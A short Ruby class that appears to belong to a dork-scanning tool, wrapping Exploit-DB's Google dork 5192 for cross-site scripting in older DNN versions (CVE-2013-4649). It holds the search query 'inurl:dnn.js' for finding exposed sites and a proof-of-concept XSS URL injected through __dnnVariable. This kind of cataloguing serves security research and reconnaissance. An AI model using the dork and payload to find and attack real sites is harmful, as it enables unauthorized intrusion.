module Dorks
   class Dork5192 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 5192",
            ghdb_url: "https://www.exploit-db.com/ghdb/5192",
            severity: "6",
            category: "advisories_and_vulnerabilities.cve-2013-4649",
            publish_date: "2019-04-23",
            author: "F1uffyGoat",
            dork: <<~EDORK,
inurl:dnn.js
EDORK
            description: <<~EDESC
Vulnerable versions: 
- DNN 7.1.0 and earlier
- DNN 6.2.8 and earlier
POC: http://www.vulnerable.com/?__dnnVariable={'__dnn_pageload':'alert(/XSS/)'}
EDESC
         })

      end
   end
end
